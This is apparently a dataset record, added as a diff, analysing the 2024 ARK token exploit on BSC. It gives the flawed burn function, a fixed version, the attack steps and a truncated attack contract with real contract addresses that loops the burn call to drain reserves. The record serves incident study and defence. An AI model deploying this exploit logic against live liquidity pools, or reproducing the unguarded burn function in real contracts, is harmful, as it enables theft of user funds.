@@ -1,0 +1,34 @@
+{
+ "id": "2024__2024-03-XX_ARK_BusinessLogicAutoBurn",
+ "source_file": "2024/2024-03-XX_ARK_BusinessLogicAutoBurn.md",
+ "title": "ARK — autoBurnLiquidityPairTokens Business Logic Flaw Analysis",
+ "date": "2024-03-01",
+ "protocol": "ARK",
+ "chain": "BSC",
+ "loss_raw": "~348 BNB",
+ "loss_usd": null,
+ "root_cause": "Repeatedly calling `autoBurnLiquidityPairTokens()` to drain the ARK reserve of the ARK/WBNB pair, then extracting WBNB at a favorable rate from the imbalanced reserves",
+ "attack_tx": null,
+ "vulnerable_contract": null,
+ "classes": [
+  "business-logic"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: no limit on repeated calls to autoBurnLiquidityPairTokens\nfunction autoBurnLiquidityPairTokens() external {\n    // No call count or block restriction\n    // Burns ARK tokens from the pair → reserve decreases\n    uint256 pairBalance = balanceOf(liquidityPair);\n    uint256 burnAmount  = pairBalance * burnRate / 10000;\n    _burn(liquidityPair, burnAmount);\n    IUniswapV2Pair(liquidityPair).sync();  // update reserves\n}\n\n//",
+  "// File: ARK_decompiled.sol\ncontract ARK {\n    function autoBurnLiquidityPairTokens() external {}  // ❌ vulnerability"
+ ],
+ "code_after": [
+  "✅ Safe code: limited to once per block + minimum reserve protection\nuint256 private lastBurnBlock;\nuint256 public constant MIN_RESERVE = 1_000_000_000e18;\n\nfunction autoBurnLiquidityPairTokens() external {\n    require(block.number > lastBurnBlock + BURN_COOLDOWN, \"too frequent\");\n    lastBurnBlock = block.number;\n    (uint112 r0,,) = IUniswapV2Pair(liquidityPair).getReserves();\n    require(r0 > MIN_RESERVE, \"reserve too low\");\n    uint256 burnAmount = uint256(r0) * burnRate / 10000;\n    _burn(liquidityPair, burnAmount);\n    IUniswapV2Pair(liquidityPair).sync();\n}"
+ ],
+ "steps": [
+  "→ [1] Repeatedly call autoBurnLiquidityPairTokens()",
+  "→ [2] Confirm ARK reserve is below threshold",
+  "→ [3] Inject 100 WBNB + remaining ARK into the pair",
+  "→ [4] Execute swap() against imbalanced reserves",
+  "→ [5] ~348 BNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Repeatedly call autoBurnLiquidityPairTokens()\n  │         └─ ARK reserve drains to ~1.7B\n  │\n  ├─→ [2] Confirm ARK reserve is below threshold\n  │\n  ├─→ [3] Inject 100 WBNB + remaining ARK into the pair\n  │         └─ Reserve ratio becomes extremely imbalanced\n  │\n  ├─→ [4] Execute swap() against imbalanced reserves\n  │         └─ Extract large amount of WBNB at favorable rate\n  │\n  └─→ [5] ~348 BNB profit",
+  "interface IARK {\n    function autoBurnLiquidityPairTokens() external;\n}\n\ninterface Uni_Pair_V2 {\n    function getReserves() external view returns (uint112 r0, uint112 r1, uint32);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n}\n\ncontract AttackContract {\n    IARK       constant ark    = IARK(0xde698B5BBb4A12DDf2261BbdF8e034af34399999);\n    Uni_Pair_V2 constant pair  = Uni_Pair_V2(0xc0F54B8755DAF1Fd78933335EfCD761e3D5B4a6F);\n    IERC20     constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n\n    function testExploit() external {\n        // [1] Loop until ARK reserve drops below ~1.7B\n        (uint112 r0,,) = pair.getReserves();\n        while (r0 > 1_700_000_000e18) {\n            ark.autoBurnLiquidityPairTokens();\n           "
+ ]
+}
